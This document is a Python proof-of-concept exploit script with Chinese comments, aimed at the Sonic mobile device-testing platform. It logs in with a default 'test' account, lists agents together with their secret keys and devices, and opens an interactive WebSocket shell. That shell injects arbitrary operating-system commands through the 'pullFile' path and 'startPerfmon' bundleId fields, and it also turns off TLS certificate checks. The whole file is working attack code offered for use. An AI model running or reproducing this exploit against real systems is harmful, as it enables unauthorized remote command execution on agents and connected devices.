import websocket
import time
import json
import sys
import ssl
import threading
import queue
import requests
import urllib3
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

message_queue = queue.Queue()
_use_wss = False   # 全局标记，run_forever() 时决定是否传 sslopt


# ── 登录，返回 (session, SonicToken) ────────────────────────
def get_token(api):
    sess = requests.Session()
    sess.headers["Content-Type"] = "application/json"
    sess.verify = False

    r = sess.post(f"{api}/users/login",
                  json={"userName": "test", "password": "123"}, timeout=8)
    if r.json().get("code") == 2000:
        print("[+] 登录 test 账号成功")
        return sess, r.json()["data"]

    print(f"[-] 登录失败: {r.json().get('message', r.text)}")
    sys.exit(1)


# ── 列出所有 Agent 及其设备，交互选择目标 ────────────────────
def select_target(api, sess, token):
    h = {"SonicToken": token}

    # 拉取所有 Agent
    agents = sess.get(f"{api}/agents/list", headers=h, timeout=8).json().get("data", [])
    if not agents:
        print("[-] 无可用 Agent"); sys.exit(1)

    # 拉取所有设备（最多 200 条）
    devs_all = (sess.get(f"{api}/devices/list?page=1&pageSize=200", headers=h, timeout=8)
                .json().get("data", {}).get("content", []))

    # 按 agentId 分组
    dev_map = defaultdict(list)
    for d in devs_all:
        dev_map[d.get("agentId")].append(d)

    # ── 打印列表 ──
    print(f"\n{'─'*58}")
    print(f"  发现 {len(agents)} 个 Agent，共 {len(devs_all)} 台设备")
    print(f"{'─'*58}")
    for i, ag in enumerate(agents):
        ag_online = "●" if ag.get("status") == "ONLINE" else "○"
        print(f"\n  [{i}] {ag_online} Agent#{ag['id']}  "
              f"{ag['host']}:{ag.get('port', 7777)}  "
              f"key={ag['secretKey']}")
        devs = dev_map.get(ag["id"], [])
        if devs:
            for j, d in enumerate(devs):
                st = d.get("status", "?")
                mark = "▶" if st in ("ONLINE", "DEBUGGING") else " "
                print(f"       {mark} [{j}] {d['udId']:<20} "
                      f"{d.get('model', '?'):<18} {st}")
        else:
            print(f"           (无关联设备)")
    print(f"\n{'─'*58}\n")

    # ── 选 Agent ──
    if len(agents) == 1:
        ag_idx = 0
        print(f"[*] 自动选择 Agent[0]: {agents[0]['host']}")
    else:
        try:
            ag_idx = int(input(f"选择 Agent [0-{len(agents)-1}]: ").strip())
        except ValueError:
            ag_idx = 0
    ag = agents[ag_idx]
    print(f"[+] 已选 Agent#{ag['id']}  {ag['host']}:{ag.get('port', 7777)}")

    # ── 选设备（仅显示该 Agent 下 ONLINE/DEBUGGING 的设备） ──
    devs = dev_map.get(ag["id"], [])
    avail = [d for d in devs if d.get("status") in ("ONLINE", "DEBUGGING")]

    if not avail:
        # agentId 字段不存在时退化为全局可用设备
        avail = [d for d in devs_all if d.get("status") in ("ONLINE", "DEBUGGING")]
    if not avail:
        print(f"[-] Agent#{ag['id']} 下无 ONLINE/DEBUGGING 设备"); sys.exit(1)

    if len(avail) == 1:
        dev_idx = 0
        print(f"[*] 自动选择设备[0]: {avail[0]['udId']}")
    else:
        print(f"\n  可用设备（Agent#{ag['id']} 下）:")
        for j, d in enumerate(avail):
            print(f"    [{j}] {d['udId']:<20} {d.get('model','?'):<18} {d.get('status')}")
        try:
            dev_idx = int(input(f"选择设备 [0-{len(avail)-1}]: ").strip())
        except ValueError:
            dev_idx = 0
    dev = avail[dev_idx]
    print(f"[+] 已选设备  udId={dev['udId']}  model={dev.get('model','?')}  "
          f"status={dev.get('status')}\n")

    return ag, dev


# ── 构造 WebSocket URL ────────────────────────────────────────
def build_ws_url(base_url, ag, dev):
    global _use_wss
    _use_wss  = base_url.lower().startswith("https")
    ws_scheme = "wss" if _use_wss else "ws"
    return (f"{ws_scheme}://{ag['host']}:{ag.get('port', 7777)}"
            f"/websockets/android/{ag['secretKey']}/{dev['udId']}/poc_token")


# ── 以下完全照抄 sonic.py ───────────────────────────────────

def on_message(ws, message):
    message_queue.put(message)

def on_error(ws, error):
    print(f"Error: {error}\n")
    ws.close()
    sys.exit(1)

def on_close(ws, status_code, reason):
    print(f"Connection close: {status_code} ,{reason}\n")

def on_open(ws):
    print(f"Connection start\n")
    input_thread = threading.Thread(target=user_input, args=(ws,))
    input_thread.start()


def user_input(ws):
    shelltype = input("输入命令类型:\n1.pullFile\n2.startPerfmon\n")
    while True:
        while not message_queue.empty():
            message = message_queue.get()
            print(message)

        detail = input("input your command: ")
        if detail.lower() == "exit":
            ws.close()
            print("Exiting...")
            break

        data = ""
        if shelltype == "1":
            cmd = "/sdcard/test.html ; " + detail + " ;"
            data = {"type": "pullFile", "path": cmd}
        elif shelltype == "2":
            cmd = " & " + detail + " && "
            data = {"type": "startPerfmon", "bundleId": cmd}
        print(data)
        json_data = json.dumps(data)
        ws.send(json_data)
        time.sleep(10)


def _parse_proxy(proxy_str):
    """解析代理字符串，返回 requests proxies dict 和 websocket proxy 元组"""
    if not proxy_str:
        return None, (None, None, None)
    from urllib.parse import urlparse
    p = urlparse(proxy_str)
    requests_proxies = {"http": proxy_str, "https": proxy_str}
    ws_proxy = (p.hostname, p.port, p.scheme.lower())
    return requests_proxies, ws_proxy


if __name__ == "__main__":
    base_url  = input("[?] Sonic Server 地址 (如 http://192.168.1.1:3000 或 https://...): ").strip().rstrip("/")
    proxy_str = input("[?] 代理地址 (留空跳过, 如 socks5://127.0.0.1:1080): ").strip() or None
    api = base_url + "/server/api/controller"

    req_proxies, ws_proxy = _parse_proxy(proxy_str)

    sess, token = get_token(api)
    if req_proxies:
        sess.proxies.update(req_proxies)
        print(f"[*] HTTP 走代理: {proxy_str}")

    ag, dev       = select_target(api, sess, token)
    websocket_url = build_ws_url(base_url, ag, dev)
    print(f"[+] WS URL: {websocket_url}\n")

    ws = websocket.WebSocketApp(websocket_url,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.on_open = on_open

    run_kwargs = {}
    if _use_wss:
        run_kwargs["sslopt"] = {"cert_reqs": ssl.CERT_NONE}
    proxy_host, proxy_port, proxy_type = ws_proxy
    if proxy_host:
        run_kwargs["http_proxy_host"] = proxy_host
        run_kwargs["http_proxy_port"] = proxy_port
        run_kwargs["proxy_type"] = proxy_type
        print(f"[*] WS 走代理: {proxy_type}://{proxy_host}:{proxy_port}")

    ws.run_forever(**run_kwargs)
